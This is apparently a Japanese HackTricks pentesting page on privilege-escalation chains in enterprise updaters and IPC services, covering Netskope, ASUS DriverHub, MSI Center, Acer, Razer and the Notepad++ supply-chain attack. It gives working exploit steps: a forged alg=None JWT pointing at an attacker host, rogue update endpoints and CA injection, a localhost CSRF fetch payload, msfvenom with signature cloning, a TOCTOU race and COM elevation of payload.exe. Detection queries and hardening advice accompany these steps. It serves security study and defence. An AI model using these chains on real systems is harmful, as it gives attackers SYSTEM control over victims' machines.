# エンタープライズの自動アップデーターと特権IPCの悪用（例：Netskope、ASUS、MSI）

{{#include ../../banners/hacktricks-training.md}}

このページは、低摩擦のIPCインターフェイスと特権的な更新フローを露出するエンタープライズ向けのエンドポイントエージェントやアップデーターに見られる、Windowsのローカル特権昇格チェーン群を一般化したものです。代表例として Netskope Client for Windows < R129 (CVE-2025-0309) があり、低権限ユーザが攻撃者支配下のサーバへ強制的に登録させ、その後 SYSTEM サービスがインストールする悪意あるMSIを配布できます。

再利用可能な主要な考え方：
- 特権サービスのlocalhost IPCを悪用して、攻撃者サーバへの再登録や再構成を強制する。
- ベンダの更新エンドポイントを実装し、改竄されたTrusted Root CAを配布して、updaterを悪意ある「署名済み」パッケージに向ける。
- 弱い署名者チェック（CN allow-lists）、任意のダイジェストフラグ、緩いMSIプロパティを回避する。
- IPCが「暗号化」されている場合、registryに保存された世界可読のマシン識別子からkey/IVを導出する。
- サービスがimage path/process nameで呼び出し元を制限する場合、allow-listedプロセスへインジェクトするか、プロセスをsuspendedで生成して最小限のスレッドコンテキストパッチでDLLをブートストラップする。

---
## 1) localhost IPC経由で攻撃者サーバへの登録を強制する

多くのエージェントは、JSONを使ってlocalhost TCP経由でSYSTEMサービスと通信するuser-mode UIプロセスを同梱している。

Netskopeで観測されたもの：
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

エクスプロイトフロー：
1) バックエンドホスト（例：AddonUrl）を制御するクレームを持つJWT登録トークンを作成する。署名が不要になるようalg=Noneを使用する。
2) provisioningコマンドを呼び出すIPCメッセージにあなたのJWTとテナント名を含めて送信する：
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) サービスが enrollment/config のためにあなたの不正なサーバーにアクセスし始める。例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- 呼び出し元の検証がパス/名前ベースの場合は、許可リストに載っているベンダーのバイナリからリクエストを発生させる（§4 を参照）。

---
## 2) Hijacking the update channel to run code as SYSTEM

クライアントがあなたのサーバーと通信したら、期待されるエンドポイントを実装し、攻撃者の MSI に誘導する。典型的なシーケンス:

1) /v2/config/org/clientconfig → 非常に短い updater interval を持つ JSON 設定を返す。例:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate を返す。サービスはそれを Local Machine Trusted Root ストアにインストールする。  
3) /v2/checkupdate → 悪意ある MSI と偽のバージョンを指すメタデータを供給する。

実際に見られる一般的なチェックのバイパス:
- Signer CN allow-list: サービスは Subject CN が “netSkope Inc” または “Netskope, Inc.” と等しいかだけをチェックする場合がある。攻撃者の rogue CA はその CN を持つエンド証明書を発行して MSI に署名できる。
- CERT_DIGEST property: CERT_DIGEST という名前の無害な MSI プロパティを含める。インストール時に強制されない。
- Optional digest enforcement: config フラグ（例: check_msi_digest=false）が追加の暗号検証を無効にする。

結果: SYSTEM サービスが C:\ProgramData\Netskope\stAgent\data\*.msi からあなたの MSI をインストールし、NT AUTHORITY\SYSTEM として任意のコードを実行する。

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope は IPC JSON を Base64 に見える encryptData フィールドでラップしていた。リバースで、任意のユーザーが読み取れるレジストリ値から派生する key/IV を使った AES であることが判明した:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻撃者はその暗号化を再現し、通常ユーザーから有効な暗号化コマンドを送信できる。一般的なヒント: エージェントが突然 “encrypts” して IPC を暗号化し始めたら、HKLM 以下の device IDs、product GUIDs、install IDs などを探せ。

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

一部のサービスは TCP 接続の PID を解決し、Program Files 以下にある allow-listed ベンダーバイナリ（例: stagentui.exe, bwansvc.exe, epdlp.exe）のイメージパス／名前と比較してピアを認証しようとする。

実用的なバイパスは次の二つ:
- allow-listed プロセス（例: nsdiag.exe）への DLL 注入と、その内部から IPC をプロキシする。
- allow-listed バイナリを suspended で生成し、CreateRemoteThread を使わずにプロキシ DLL をブートストラップして（see §5）、ドライバが強制する改竄防止ルールを満たす。

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

製品はしばしば minifilter/OB callbacks ドライバ（例: Stadrv）を同梱し、保護されたプロセスへのハンドルから危険な権限を剥ぎ取る:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

これらの制約を尊重する信頼できるユーザーモードローダの手順例:
1) CreateProcess でベンダーのバイナリを CREATE_SUSPENDED にして起動する。
2) まだ取得可能なハンドルを得る: プロセスに対して PROCESS_VM_WRITE | PROCESS_VM_OPERATION、スレッドに対しては THREAD_GET_CONTEXT/THREAD_SET_CONTEXT のハンドル（既知の RIP にコードパッチを当てるなら THREAD_RESUME のみでも可）。
3) ntdll!NtContinue（またはその他の早期に確実にマップされる thunk）を、あなたの DLL パスで LoadLibraryW を呼び、その後戻る小さなスタブで上書きする。
4) ResumeThread してプロセス内でスタブをトリガーし、DLL をロードさせる。

既に保護されたプロセスに対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使っていない（あなたがプロセスを作成した）ため、ドライバのポリシーは満たされる。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) は rogue CA、自動の悪意ある MSI 署名を実行し、必要なエンドポイントを提供する: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope は任意（オプションで AES-encrypted）IPC メッセージを作成するカスタム IPC クライアントで、allow-listed バイナリから発信するための suspended-process 注入を含む。

## 7) Fast triage workflow for unknown updater/IPC surfaces

新しいエンドポイントエージェントやマザーボードの “helper” スイートに直面したとき、短いワークフローでそれが有望な privesc ターゲットかどうかを判断できることが多い:

1) ループバックリスナーを列挙し、それらをベンダープロセスにマッピングする:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 候補となる named pipes を列挙する:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) プラグインベースの IPC サーバーが使用する、レジストリに保存されたルーティングデータを抽出する:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) まず user-mode client から endpoint names、JSON keys、command IDs を抽出する。Packed Electron/.NET frontends は頻繁に full schema を leak する：
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
ターゲットが呼び出し元を PID、image path、または process name のみで認証している場合、それを境界ではなく単なる障害（speed bump）として扱ってください：正当なクライアントにインジェクトするか、allow-listed なプロセスから接続するだけでサーバーのチェックを満たすことが多いです。特に named pipes に関しては、[this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) がこのプリミティブをより詳しく扱っています。

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub は 127.0.0.1:53000 でユーザーモードの HTTP サービス (ADU.exe) を提供しており、ブラウザからの呼び出しが https://driverhub.asus.com から来ることを期待しています。origin フィルタは Origin ヘッダと `/asus/v1.0/*` が公開するダウンロード URL に対して単に `string_contains(".asus.com")` を実行するだけです。したがって `https://driverhub.asus.com.attacker.tld` のような攻撃者管理下のホストはチェックを通過し、JavaScript から状態を変更するリクエストを発行できます。追加のバイパスパターンは [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) を参照してください。

Practical flow:
1) `.asus.com` を含むドメインを登録し、そこで悪意のある Web ページをホストする。  
2) `fetch` または XHR を使って `http://127.0.0.1:53000` の特権エンドポイント（例: `Reboot`, `UpdateApp`）を呼び出す。  
3) ハンドラが期待する JSON ボディを送信する — packed frontend JS が下にスキーマを示している。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
以下に示した PowerShell CLI でも、Origin header が spoofed されて trusted value に設定されると成功します:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) 署名検証の不備と証明書クローン (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` は JSON ボディで定義された任意の実行ファイルをダウンロードし、`C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` にキャッシュします。ダウンロードURLの検証は同じ部分文字列ロジックを再利用しているため、`http://updates.asus.com.attacker.tld:8000/payload.exe` のようなものが許可されます。ダウンロード後、ADU.exe は実行前に PE に署名が含まれていることと Subject 文字列が ASUS と一致することだけを確認します — `WinVerifyTrust` もチェーン検証も行いません。

フローを武器化するには:
1) ペイロードを作成する（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) ASUS の signer をそれにクローンする（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) `pwn.exe` を `.asus.com` に見せかけたドメインでホストし、上記のブラウザCSRFで UpdateApp をトリガーする。

Origin と URL のフィルタがどちらも部分文字列ベースで、署名者チェックが文字列比較だけであるため、DriverHub は攻撃者のバイナリを引き込み、その昇格済みコンテキストで実行します。

---
## 1) アップデータのコピー/実行パス内の TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center の SYSTEM サービスは TCP プロトコルを公開しており、各フレームは `4-byte ComponentID || 8-byte CommandID || ASCII arguments` です。コアコンポーネント（Component ID `0f 27 00 00`）は `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` を搭載しています。そのハンドラは:
1) 指定された実行ファイルを `C:\Windows\Temp\MSI Center SDK.exe` にコピーする。
2) `CS_CommonAPI.EX_CA::Verify` によって署名を検証する（証明書の subject は “MICRO-STAR INTERNATIONAL CO., LTD.” と一致し、`WinVerifyTrust` が成功すること）。
3) そのテンポラリファイルを SYSTEM として攻撃者制御の引数で実行するスケジュールタスクを作成する。

コピーされたファイルは検証と `ExecuteTask()` の間でロックされません。攻撃者は以下を行えます:
- 署名済みの正当な MSI バイナリを指す Frame A を送信する（署名チェックが通過し、タスクがキューに入ることを保証する）。
- 悪意あるペイロードを指す Frame B を繰り返し送ってレースを仕掛け、検証直後に `MSI Center SDK.exe` を上書きする。

スケジューラが起動すると、元のファイルが検証されていても上書きされたペイロードを SYSTEM として実行します。確実な悪用は 2 つの goroutine/スレッドを使い、TOCTOU ウィンドウを奪うまで CMD_AutoUpdateSDK を連打することで達成されます。

---
## 2) カスタム SYSTEM レベルの IPC & impersonation の悪用 (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` によってロードされる各プラグイン/DLL は `HKLM\SOFTWARE\MSI\MSI_CentralServer` に格納された Component ID を受け取ります。フレームの最初の4バイトでそのコンポーネントを選択できるため、攻撃者は任意のモジュールにコマンドをルーティングできます。
- プラグインは独自のタスクランナーを定義可能です。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を公開しており、`API_Support.EX_Task::ExecuteTask()` を直接呼び出します（**no signature validation**） — 任意のローカルユーザは `C:\Users\<user>\Desktop\payload.exe` を指すだけで確実に SYSTEM 実行が得られます。
- Wireshark でループバックを嗅ぎ回すか、dnSpy で .NET バイナリをインストルメントすると、Component ↔ command のマッピングが素早く明らかになり、カスタムの Go/Python クライアントでフレームを再生できます。

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) は `\\.\pipe\treadstone_service_LightMode` を公開しており、その discretionary ACL はリモートクライアント（例: `\\TARGET\pipe\treadstone_service_LightMode`）を許可しています。コマンド ID `7` とファイルパスを送ると、サービスのプロセス生成ルーチンが呼ばれます。
- クライアントライブラリは引数とともにマジック終端バイト（113）をシリアライズします。Frida/`TsDotNetLib` を使った動的インストルメンテーション（計測のヒントは [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）により、ネイティブハンドラがこの値を `SECURITY_IMPERSONATION_LEVEL` と整合性 SID にマッピングしてから `CreateProcessAsUser` を呼んでいることが示されます。
- 113（`0x71`）を 114（`0x72`）に入れ替えると、フル SYSTEM トークンを保持し高い整合性 SID（`S-1-16-12288`）を設定する汎用ブランチに入り込みます。したがって生成されるバイナリはローカルでもクロスマシンでも制限のない SYSTEM として動作します。
- これを公開されているインストーラフラグ（`Setup.exe -nocheck`）と組み合わせれば、ベンダ機器がなくてもラボ VM 上で ACC を立ち上げてパイプを試すことができます。

これらの IPC バグは、localhost サービスが相互認証（ALPC SIDs、`ImpersonationLevel=Impersonation` フィルタ、トークンフィルタリング）を強制する必要があること、そしてすべてのモジュールの「任意バイナリを実行する」ヘルパーが同一の署名検証を共有すべき理由を示しています。

---
## 3) COM/IPC の “elevator” ヘルパー（弱いユーザーモード検証に依存） (Razer Synapse 4)

Razer Synapse 4 はこのファミリにもう一つ有用なパターンを追加しました: 権限の低いユーザが COM ヘルパに `RzUtility.Elevator` を通してプロセスの起動を要求でき、信頼判断が特権境界内で堅牢に強制されずにユーザーモード DLL（`simple_service.dll`）に委譲されます。

観測された悪用経路:
- COM オブジェクト `RzUtility.Elevator` をインスタンス化する。
- `LaunchProcessNoWait(<path>, "", 1)` を呼んで昇格起動を要求する。
- 公開された PoC では、リクエスト発行前に `simple_service.dll` 内の PE 署名ゲートがパッチアウトされており、任意の攻撃者選択の実行ファイルが起動可能になります。

最小限の PowerShell 呼び出し:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
総括: “helper” スイートをリバースする際は、localhost の TCP や named pipes で止まらないこと。`Elevator`、`Launcher`、`Updater`、`Utility` のような名前の COM クラスを探し、権限の高いサービスがターゲットバイナリ自体を検証しているのか、それともパッチ可能な user-mode クライアント DLL が計算した結果を単に信頼しているだけなのかを確認する。このパターンは Razer に限らない。高権限のブローカーが低権限側の allow/deny 決定を消費するような分割設計は、privesc の攻撃面になり得る。

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

古い WinGUp ベースの Notepad++ アップデータは更新の真正性を完全に検証していなかった。攻撃者がアップデートサーバのホスティングプロバイダを侵害すると、XML マニフェストを改ざんして特定のクライアントだけを攻撃者の URL にリダイレクトできた。クライアントが信頼できる証明書チェーンと有効な PE 署名の両方を強制せず任意の HTTPS レスポンスを受け入れていたため、被害者はトロイ化された NSIS `update.exe` を取得して実行してしまった。

Operational flow (no local exploit required):
1. **Infrastructure interception**: CDN/hosting を侵害し、更新チェックに対して攻撃者のメタデータで悪意のあるダウンロード URL を指す応答を返す。
2. **Trojanized NSIS**: インストーラはペイロードを取得/実行し、次の2つの実行チェーンを悪用する:
- **Bring-your-own signed binary + sideload**: 署名済みの Bitdefender `BluetoothService.exe` をバンドルし、その検索パスに悪意ある `log.dll` を配置する。署名済みバイナリが実行されると Windows が `log.dll` をサイドロードし、`log.dll` は Chrysalis バックドアを復号してリフレクティブにロードする（Warbird-protected + API hashing による静的検出の困難化）。
- **Scripted shellcode injection**: NSIS はコンパイルされた Lua スクリプトを実行し、Win32 API（例: `EnumWindowStationsW`）を使ってシェルコードを注入し、Cobalt Strike Beacon をステージする。

Hardening/detection takeaways for any auto-updater:
- ダウンロードされたインストーラに対して **certificate + signature verification** を強制する（ベンダー署名者をピンニングし、CN/チェーン不一致を拒否）と、更新マニフェスト自体に署名する（例: XMLDSig）。検証されていない限りマニフェスト制御のリダイレクトをブロックする。
- **BYO signed binary sideloading** をポストダウンロードの検出ピボットとして扱う: 署名済みベンダー EXE が正規のインストールパス外から DLL 名をロードした場合（例: Bitdefender が Temp/Downloads から `log.dll` をロードする）や、アップデータが Temp に非ベンダー署名のインストーラをドロップ/実行した場合にアラートを上げる。
- このチェーンで観測された **malware-specific artifacts** を監視する（汎用ピボットとして有用）: mutex `Global\Jdhfv_1.0.1`、`gup.exe` の `%TEMP%` への異常な書き込み、Lua 駆動のシェルコード注入ステージ。

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> が Notepad++ 以外のインストーラーを起動する</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

これらのパターンは、unsigned manifests を受け入れる、あるいは installer signers をピンしない updater 一般に当てはまります — network hijack + malicious installer + BYO-signed sideloading により、“trusted” updates の名の下で remote code execution を引き起こします。

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
